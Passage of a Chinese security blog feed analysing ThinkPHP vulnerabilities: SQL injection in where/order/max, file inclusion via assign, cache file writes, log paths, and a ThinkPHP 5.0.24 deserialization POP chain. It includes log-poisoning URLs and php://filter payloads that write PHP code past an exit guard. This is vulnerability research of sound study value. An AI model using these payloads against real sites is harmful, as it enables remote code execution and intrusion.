class="line-numbers-rows"><span></span></span></code></pre><p>继续偷mochazz师傅的图：</p><p><img src="../../../typora-user-images/image-20240910170538409.png" alt="image-20240910170538409" /></p><h4 id="漏洞修复-6"><a class="markdownIt-Anchor" href="#漏洞修复-6"></a> 漏洞修复</h4><p>直接删除了相关代码</p><p><img src="../../../typora-user-images/image-20240910170448242.png" alt="image-20240910170448242" /></p><h3 id="3-where方法exp注入全版本"><a class="markdownIt-Anchor" href="#3-where方法exp注入全版本"></a> 3. where方法exp注入（全版本）</h3><h4 id="vuldemo-7"><a class="markdownIt-Anchor" href="#vuldemo-7"></a> VulDemo</h4><ul><li>Where 第2个参数为exp</li><li>Where第3个参数可控</li><li>开启debug</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token string single-quoted-string">'select success'</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-7"><a class="markdownIt-Anchor" href="#影响版本-7"></a> 影响版本</h4><p>全版本</p><h4 id="漏洞分析-7"><a class="markdownIt-Anchor" href="#漏洞分析-7"></a> 漏洞分析</h4><ol><li>where方法，parseWhereExp是解析参数的方法，不太重要。</li></ol><p><img src="../../../typora-user-images/image-20240910172921594.png" alt="image-20240910172921594" /></p><ol start="2"><li>看select方法</li></ol><p><img src="../../../typora-user-images/image-20240910173339004.png" alt="image-20240910173339004" /></p><ol start="3"><li>跟入到parseWhere方法</li></ol><p><img src="../../../typora-user-images/image-20240910173409721.png" alt="image-20240910173409721" /></p><ol start="4"><li>跟入到buildWhere方法</li></ol><p><img src="../../../typora-user-images/image-20240910173619128.png" alt="image-20240910173619128" /></p><ol start="5"><li>会执行到parseWhereItem方法</li></ol><p><img src="../../../typora-user-images/image-20240910174002024.png" alt="image-20240910174002024" /></p><h4 id="漏洞修复-7"><a class="markdownIt-Anchor" href="#漏洞修复-7"></a> 漏洞修复</h4><p>未修复</p><h3 id="4where方法not-like注入010"><a class="markdownIt-Anchor" href="#4where方法not-like注入010"></a> 4.where方法not like注入（0.10）</h3><h4 id="vuldemo-8"><a class="markdownIt-Anchor" href="#vuldemo-8"></a> VulDemo</h4><ul><li>where参数可控</li><li>开启debug</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">public function index()    &#123;        $username &#x3D; request()-&gt;get(&#39;username&#x2F;a&#39;);        $result &#x3D; db(&#39;users&#39;)-&gt;where([&#39;username&#39; &#x3D;&gt; $username])-&gt;select();        var_dump($result);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-8"><a class="markdownIt-Anchor" href="#影响版本-8"></a> 影响版本</h4><p>5.0.10</p><h4 id="漏洞分析-8"><a class="markdownIt-Anchor" href="#漏洞分析-8"></a> 漏洞分析</h4><p>漏洞分析与上面的exp相同，不过not like是自己传的，不是上面定义好的exp。</p><p>不过多分析了</p><p><img src="../../../typora-user-images/image-20240910180127484.png" alt="image-20240910180127484" /></p><p><img src="../../../typora-user-images/image-20240910180238930.png" alt="image-20240910180238930" /></p><h4 id="漏洞修复-8"><a class="markdownIt-Anchor" href="#漏洞修复-8"></a> 漏洞修复</h4><p>增加了关键字过滤</p><p><img src="../../../typora-user-images/image-20240910180310523.png" alt="image-20240910180310523" /></p><h3 id="5-order方法注入116-122"><a class="markdownIt-Anchor" href="#5-order方法注入116-122"></a> 5. order方法注入（1.16-1.22）</h3><h4 id="vuldemo-9"><a class="markdownIt-Anchor" href="#vuldemo-9"></a> VulDemo</h4><ul><li>order方法参数可控</li><li>开启debug</li><li>调用find方法</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">public function index()    &#123;        $orderby &#x3D; request()-&gt;get(&#39;orderby&#39;);        $result &#x3D; db(&#39;users&#39;)-&gt;where([&#39;username&#39; &#x3D;&gt; &#39;mochazz&#39;])-&gt;order($orderby)-&gt;find();        var_dump($result);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-9"><a class="markdownIt-Anchor" href="#影响版本-9"></a> 影响版本</h4><p>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</p><h4 id="漏洞分析-9"><a class="markdownIt-Anchor" href="#漏洞分析-9"></a> 漏洞分析</h4><p>这个与上面分析的tp3一样，都是parseOrder方法的问题</p><p>不做详细分析</p><p><img src="../../../typora-user-images/image-20240910181002235.png" alt="image-20240910181002235" /></p><p><img src="../../../typora-user-images/image-20240910181019096.png" alt="image-20240910181019096" /></p><h4 id="漏洞修复-9"><a class="markdownIt-Anchor" href="#漏洞修复-9"></a> 漏洞修复</h4><p>增加判断）和#</p><p><img src="../../../typora-user-images/image-20240910181040568.png" alt="image-20240910181040568" /></p><h3 id="6-max方法聚合查询注入00-02113-125"><a class="markdownIt-Anchor" href="#6-max方法聚合查询注入00-02113-125"></a> 6. max方法聚合查询注入（0.0-0.21，1.3-1.25）</h3><h4 id="vuldemo-10"><a class="markdownIt-Anchor" href="#vuldemo-10"></a> VulDemo</h4><ul><li>max方法参数可控</li><li>开启debug</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">max</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-10"><a class="markdownIt-Anchor" href="#影响版本-10"></a> 影响版本</h4><p><strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong></p><h4 id="漏洞分析-10"><a class="markdownIt-Anchor" href="#漏洞分析-10"></a> 漏洞分析</h4><p>max方法实战中用的非常少</p><p>不花时间分析了</p><p><img src="../../../typora-user-images/image-20240910182130657.png" alt="image-20240910182130657" /></p><p><img src="../../../typora-user-images/image-20240910182207168.png" alt="image-20240910182207168" /></p><h4 id="漏洞修复-10"><a class="markdownIt-Anchor" href="#漏洞修复-10"></a> 漏洞修复</h4><p>增加了正则匹配，仅允许字母和. *</p><p><img src="../../../typora-user-images/image-20240910182252180.png" alt="image-20240910182252180" /></p><h1 id="0x03-tp6"><a class="markdownIt-Anchor" href="#0x03-tp6"></a> 0x03 TP6</h1><h2 id="1-session任意文件写入00-01"><a class="markdownIt-Anchor" href="#1-session任意文件写入00-01"></a> 1. Session任意文件写入（0.0-0.1）</h2><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.0任意文件写.md</a></p><h1 id="0x04-文件包含"><a class="markdownIt-Anchor" href="#0x04-文件包含"></a> 0x04 文件包含</h1><h2 id="1assign参数可控导致的文件包含"><a class="markdownIt-Anchor" href="#1assign参数可控导致的文件包含"></a> 1.assign参数可控导致的文件包含</h2><h3 id="触发条件"><a class="markdownIt-Anchor" href="#触发条件"></a> 触发条件</h3><ol><li>存在类似assign函数参数可控的代码</li></ol><p><img src="../../../typora-user-images/image-20240816144806251.png" alt="image-20240816144806251" /></p><pre class="line-numbers language-none"><code class="language-none">assign方法第一个变量可控&#x3D;&gt;变量覆盖&#x3D;&gt;任意文件包含&#x3D;&gt;RCE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题外话：本地搭建调试环境的时候，提示找不到模板，自己在<code>Application\Home\View\Index</code>下面新建了模板文件</p><h3 id="漏洞分析-11"><a class="markdownIt-Anchor" href="#漏洞分析-11"></a> 漏洞分析</h3><ol><li>assign只做了赋值操作</li></ol><p><img src="../../../typora-user-images/image-20240816144850011.png" alt="image-20240816144850011" /></p><ol start="2"><li>跟入fetch</li></ol><p><img src="../../../typora-user-images/image-20240816144934461.png" alt="image-20240816144934461" /></p><ol start="3"><li>跟入listen函数</li></ol><p><img src="../../../typora-user-images/image-20240816145025426.png" alt="image-20240816145025426" /></p><ol start="4"><li>跟入exec</li></ol><p><img src="../../../typora-user-images/image-20240816145114321.png" alt="image-20240816145114321" /></p><ol start="5"><li>跟入赋值类的run方法</li></ol><p><img src="../../../typora-user-images/image-20240816145137086.png" alt="image-20240816145137086" /></p><ol start="6"><li>函数参数是我们传的参数，跟入最后的断点处</li></ol><p><img src="../../../typora-user-images/image-20240816145240625.png" alt="image-20240816145240625" /></p><ol start="7"><li>跟入fetch后的load方法</li></ol><p><img src="../../../typora-user-images/image-20240816145428421.png" alt="image-20240816145428421" /></p><ol start="8"><li>很明显的变量覆盖+文件包含，这也是为什么我们需要传入数组变量，key值为_filename</li></ol><p><img src="../../../typora-user-images/image-20240816145751936.png" alt="image-20240816145751936" /></p><p><img src="../../../typora-user-images/image-20240816145818684.png" alt="image-20240816145818684" /></p><p>tp的日志记录：</p><pre class="line-numbers language-none"><code class="language-none">未开启debug：\Application\Runtime\Logs\Common\（一般选择&#x2F;?s&#x3D;--&gt;&lt;?&#x3D;phpinfo();?&gt;去触发）\Application\Runtime\Logs\Home\（可以用?s&#x3D;&#x2F;home&#x2F;index&#x2F;&lt;?&#x3D;phpinfo();?&gt;去触发）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-文件写入"><a class="markdownIt-Anchor" href="#0x05-文件写入"></a> 0x05 文件写入</h1><h2 id="1s方法和f方法或cacheset参数可控"><a class="markdownIt-Anchor" href="#1s方法和f方法或cacheset参数可控"></a> 1.S方法和F方法或Cache::set参数可控</h2><h3 id="vuldemo-11"><a class="markdownIt-Anchor" href="#vuldemo-11"></a> VulDemo</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET.name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">S</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞分析-12"><a class="markdownIt-Anchor" href="#漏洞分析-12"></a> 漏洞分析</h3><ol><li>跟到$cache的set方法</li></ol><p><img src="../../../typora-user-images/image-20240906150903581.png" alt="image-20240906150903581" /></p><ol start="2"><li>分析文件写入的部分，看两个参数的初始化位置。一个是filename方法获取，一个是序列化后的值</li></ol><p><img src="../../../typora-user-images/image-20240906151003887.png" alt="image-20240906151003887" /></p><ol start="3"><li>filename值，md5计算，拼接配置中的文件夹前缀。</li></ol><p><img src="../../../typora-user-images/image-20240906151202004.png" alt="image-20240906151202004" /></p><ol start="4"><li>写入的文件data中包含//注释符，只要在data添加%0d换行就可以了</li></ol><p><img src="../../../typora-user-images/image-20240906151545064.png" alt="" /></p><p>文件名为上面分析的，md5（name）的值</p><p><img src="../../../typora-user-images/image-20240906151748198.png" alt="image-20240906151748198" /></p><p><img src="../../../typora-user-images/image-20240906151956563.png" alt="image-20240906151956563" /></p><h3 id="f方法"><a class="markdownIt-Anchor" href="#f方法"></a> F方法</h3><p>F方法很直接，直接写文件，不过多分析。</p><p><img src="../../../typora-user-images/image-20240906153209845.png" alt="image-20240906153209845" /></p><h1 id="0x06-tp的日志"><a class="markdownIt-Anchor" href="#0x06-tp的日志"></a> 0x06 TP的日志</h1><h2 id="1-不同的日志含义"><a class="markdownIt-Anchor" href="#1-不同的日志含义"></a> 1. 不同的日志含义</h2><p>默认有不同的log路径</p><ul><li>Runtime\Logs\Common: 记录系统的整体运行状态</li></ul><p>​TP3未开启debug情况下记录的信息：</p><p><img src="../../../typora-user-images/image-20240911102033818.png" alt="image-20240911102033818" /></p><ul><li>Runtime\Logs\Home: 记录模块运行的状态</li></ul><p>​TP3未开启debug情况下记录的信息：</p><p>​会记录系统报错信息和SQL语句相关</p><p><img src="../../../typora-user-images/image-20240911102141866.png" alt="image-20240911102141866" /></p><h2 id="2-日志路径"><a class="markdownIt-Anchor" href="#2-日志路径"></a> 2. 日志路径</h2><h3 id="tp3"><a class="markdownIt-Anchor" href="#tp3"></a> TP3</h3><p><strong>路径：</strong></p><pre class="line-numbers language-none"><code class="language-none">Runtime&#x2F;Logs&#x2F;Runtime&#x2F;Logs&#x2F;Admin&#x2F;Runtime&#x2F;Logs&#x2F;Backend&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;App&#x2F;Runtime&#x2F;Logs&#x2F;App&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Admin&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;App&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Ext&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Api&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Test&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Service&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>日志名字：</strong></p><p>年份后两位_月份_日期.log</p><p>24_01_23.log</p><h3 id="tp5"><a class="markdownIt-Anchor" href="#tp5"></a> TP5</h3><p><strong>路径：</strong></p><pre class="line-numbers language-none"><code class="language-none">runtime&#x2F;log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>日志名字，存在多个后缀：</strong></p><p>年份月份/日期.log</p><p>202409/10.log<br />202409/10_cli.log<br />202409/10_error.log<br />202409/10_sql.log</p><h3 id="tp6"><a class="markdownIt-Anchor" href="#tp6"></a> TP6</h3><p><strong>路径：</strong></p><pre class="line-numbers language-none"><code class="language-none">runtime&#x2F;log&#x2F;runtime&#x2F;log&#x2F;Home&#x2F;runtime&#x2F;log&#x2F;Common&#x2F;runtime&#x2F;log&#x2F;Admin&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>日志名字：</strong></p><p>年份月份/日期.log</p><p>202409/10.log</p><h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1><p><a href="https://xz.aliyun.com/t/14451?time__1311=GqAxuWqCqYq05DK5YI9l4hT907A4D#toc-22">https://xz.aliyun.com/t/14451?time__1311=GqAxuWqCqYq05DK5YI9l4hT907A4D#toc-22</a></p><p><a href="https://www.cnblogs.com/lktop/p/13802598.html">https://www.cnblogs.com/lktop/p/13802598.html</a></p><p><a href="https://xz.aliyun.com/t/9326">https://xz.aliyun.com/t/9326</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p><a href="https://furina.org.cn/2024/01/25/thinkphp-log-leakage/">https://furina.org.cn/2024/01/25/thinkphp-log-leakage/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-序&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-序&quot;&gt;&lt;/a&gt; 0x00 序&lt;/h1&gt;
&lt;p&gt;上面我们分析了TP框架存在的默认漏洞，此篇分析一下非默认环境下的漏洞，可能主要包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;某些内置</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP反序列化POP链分析</title>
    <link href="https://cyxsec.github.io/2023/05/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyxsec.github.io/2023/05/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-05-16T06:36:57.000Z</published>
    <updated>2024-09-19T02:10:08.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-反序列化利用链"><a class="markdownIt-Anchor" href="#0x01-反序列化利用链"></a> 0x01 反序列化利用链</h1><h2 id="审计思路"><a class="markdownIt-Anchor" href="#审计思路"></a> 审计思路</h2><p><strong>php魔术方法</strong></p><pre class="line-numbers language-none"><code class="language-none">__call调用不可访问或不存在的方法时被调用__callStatic调用不可访问或不存在的静态方法时被调用__clone进行对象clone时被调用，用来调整对象的克隆行为__constuct构建对象的时被调用；__debuginfo当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本__destruct明确销毁对象或脚本结束时被调用；__get读取不可访问或不存在属性时被调用__invoke当以函数方式调用对象时被调用__isset对不可访问或不存在的属性调用isset()或empty()时被调用__set当给不可访问或不存在属性赋值时被调用__set_state当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。__sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用__toString当一个类被转换成字符串时被调用__unset对不可访问或不存在的属性进行unset时被调用__wakeup当使用unserialize时被调用，可用于做些对象的初始化操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>反序列化的起点：</strong></p><p>__wakeup和__destruct两个魔术方法</p><p><strong>反序列化的跳板：</strong></p><pre class="line-numbers language-none"><code class="language-none">__toString 当一个对象被当做字符串使用__get 读取不可访问或不存在属性时被调用__set 当给不可访问或不存在属性赋值时被调用__isset 对不可访问或不存在的属性调用isset()或empty()时被调用__call 调用不可访问或不存在的方法时被调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>反序列化的终点：</strong></p><pre class="line-numbers language-none"><code class="language-none">call_user_func 回调函数call_user_func_array 回调函数file_put_contents 文件写入$a($b) 变量函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化链的审计思路就是把上面的思路联系起来：</p><ol><li>寻找__wakeup和__destruct魔术方法，查看里面是否有机会调用其他魔术方法，比如调用不存在的方法会调用__call的魔术方法</li><li>接下来的思路就是继续寻找可以利用的魔术方法</li><li>寻找最终的终点函数，如方法中存在callback调用和文件写入、变量函数等等，总之就能能漏洞利用的点。</li></ol><p>这就是整个反序列化链的构造方式</p><h2 id="1thinkphp-50x-反序列化"><a class="markdownIt-Anchor" href="#1thinkphp-50x-反序列化"></a> ①ThinkPHP 5.0.x 反序列化</h2><p>测试版本：5.0.24</p><h3 id="一-反序列化链调通过程"><a class="markdownIt-Anchor" href="#一-反序列化链调通过程"></a> 一、反序列化链调通过程</h3><h4 id="1-寻找入口点"><a class="markdownIt-Anchor" href="#1-寻找入口点"></a> 1. 寻找入口点</h4><p>寻找__destruct魔术方法</p><p><img src="../../../typora-user-images/image-20240911150823578.png" alt="image-20240911150823578" /></p><h4 id="2-寻找中途的魔术方法"><a class="markdownIt-Anchor" href="#2-寻找中途的魔术方法"></a> 2. 寻找中途的魔术方法</h4><ol><li>跟入removeFiles方法，这里处理$filename变量，unlink会触发toString魔术方法。</li></ol><p><img src="../../../typora-user-images/image-20240911151148298.png" alt="image-20240911151148298" /></p><ol start="2"><li>寻找可使用的toString方法</li></ol><p><img src="../../../typora-user-images/image-20240911151718647.png" alt="image-20240911151718647" /></p><p>跟入toJson方法</p><p><img src="../../../typora-user-images/image-20240911151808198.png" alt="image-20240911151808198" /></p><p>跟入toArray方法</p><p><img src="../../../typora-user-images/2135181-20211128215457370-1791873425.png" alt="2135181-20211128215457370-1791873425" /></p><p>912行这里有一个对象调用方法的代码，在找不到对象的方法时，会调用__call魔术方法</p><p><img src="../../../typora-user-images/image-20240911153458094.png" alt="image-20240911153458094" /></p><ol start="3"><li>寻找可利用的__call魔术方法</li></ol><p><img src="../../../typora-user-images/image-20240911154109705.png" alt="image-20240911154109705" /></p><p>跟入block方法</p><p><img src="../../../typora-user-images/image-20240911154154119.png" alt="image-20240911154154119" /></p><p>跟入writeln方法</p><p><img src="../../../typora-user-images/image-20240911154238309.png" alt="image-20240911154238309" /></p><p>跟入到write方法，这里可能得到了一个调用任意类的write方法的地方</p><p><img src="../../../typora-user-images/image-20240911154252886.png" alt="image-20240911154252886" /></p><p>这里得到了一个调用任意类的set方法的地方</p><p><img src="../../../typora-user-images/image-20240911154444740.png" alt="image-20240911154444740" /></p><h4 id="3找到最终利用点"><a class="markdownIt-Anchor" href="#3找到最终利用点"></a> 3.找到最终利用点</h4><p>set方法就很熟悉了，我们之前分析命令执行的时候</p><p>\think\cache\driver\File::set</p><p><img src="../../../typora-user-images/image-20240911154651163.png" alt="image-20240911154651163" /></p><p>文件写入的时候，有exit，这个看p牛的文件写入绕死亡exit就行了。</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><h4 id="4构造完整利用链"><a class="markdownIt-Anchor" href="#4构造完整利用链"></a> 4.构造完整利用链</h4><p><strong>分析如何才能调用__call方法</strong></p><p>主要有四个if逻辑，最后让最下面的$value为想调用__call方法的类即可，先分析if逻辑，后分析赋值逻辑</p><ul><li>$relation要为Model类自带的方法名称</li><li>执行Model类的方法后，获取的类，方法要存在getBindAttr</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>A</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">也</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">bindAttr参数要不为空，也就是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">A</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span></span></span></span>modelRelation类要存在getBindAttr方法要有返回值</li><li>不设置data[$key]的值</li></ul><p><img src="../../../typora-user-images/image-20240911174406671.png" alt="image-20240911174406671" /></p><p>变量赋值对应着右边的三个方法</p><ul><li>第一处parseName方法仅做大小写替换操作，$relation可控</li><li>第二处调用该类自己的方法，这里找到了getError方法，因为方法的返回值是可控的，$modelRelation可控</li><li>第三处调用的方法跟进去，在第一个if逻辑，返回值为this-&gt;parent，可控。</li></ul><p><img src="../../../typora-user-images/image-20240911175535696.png" alt="image-20240911175535696" /></p><p>分析一下第三处的方法的if逻辑</p><ul><li>第一处返回值可控</li><li>第二处我们需要寻找一个可控的getModel方法的类，在下方的Query类即可找到可控的。</li></ul><p><img src="../../../typora-user-images/image-20240911181833527.png" alt="image-20240911181833527" /></p><p><img src="../../../typora-user-images/image-20240911181623160.png" alt="image-20240911181623160" /></p><p>接下来就是符合Relation子类了，这个类还要有getBindAttr方法</p><p>找到了OneToOne类，同时这里的bindAttr参数也是可控的，这样最开始的逻辑也能进去了。</p><p><img src="../../../typora-user-images/image-20240911182518131.png" alt="image-20240911182518131" /></p><p><img src="../../../typora-user-images/image-20240911182354185.png" alt="image-20240911182354185" /></p><p>这下call魔术方法已经可以正常调用到了</p><p>后面的call魔术方法触发set逻辑很简单，没有if之类的逻辑，问题在绕过死亡exit的地方。</p><h3 id="二-死亡exit绕过"><a class="markdownIt-Anchor" href="#二-死亡exit绕过"></a> 二、死亡exit绕过</h3><p>这个在p牛的博客已经写过了，简单来说就是filename可控的时候，使用php://filter伪协议会把content编码处理，这样exit就不会写到文件中了。</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><img src="../../../typora-user-images/image-20240912112011325.png" alt="image-20240912112011325" /></p><p>p🐂这里给的例子是函数两个参数均可控的时候，如果filename和content为一个参数时</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php$content &#x3D; $_GET[content];file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></p><p>看一下这篇博客。</p><p><strong>简单学习和总结一下：</strong></p><ol><li>我们想到的第一种方式就是依旧和上面一样的思路，使用base64过滤器</li></ol><p><code>php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php</code>或者<code>php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></p><p>这样写入的内容应该是&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php的base64解码，但是实际会生成文件，但无法写入内容。因为base64在=后面不能存在字符。</p><ol start="2"><li>因此想办法去掉=即可，寻找可用的php的过滤器。</li></ol><p>string.strip.tags过滤器，去除html和php标签（在php7.3后无法使用）</p><p>这样得到了一个payload：</p><p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p><p>但这样写，文件名存在特殊字符，Windows下面无法创建文件</p><p>Linux测试一下</p><p><img src="../../../typora-user-images/image-20240913142115389.png" alt="image-20240913142115389" /></p><p>利用跨目录控制文件名。</p><p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../1.php</code></p><p><strong>这个在Windows环境下做测试居然失败了，难道是跨目录的问题？暂时没研究了</strong></p><p><img src="../../../typora-user-images/image-20240913142520525.png" alt="image-20240913142520525" /></p><ol start="3"><li>考虑使用其他编码类的过滤器，这样就可以避免=带来的问题了。</li></ol><p><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=1.php</code></p><p>使用rot13凯撒，同时php寻找不到过滤器只会抛出警告，所以我们的payload可以放在过滤器的位置（<strong>但无法在tp中使用，tp会直接抛出异常</strong>）</p><p>最终结果如下：</p><p>如果php不开启短标签的话，前面的&lt;?部分就会被忽略，不会影响解析</p><p><img src="../../../typora-user-images/image-20240913143441913.png" alt="image-20240913143441913" /></p><ol start="4"><li>上面的rot13在短标签开启的时候会报错，无法正常使用，可以使用自带的iconv的过滤器</li></ol><p>usc-2过滤器：两位一反转</p><p><img src="../../../typora-user-images/image-20240913143814907.png" alt="image-20240913143814907" 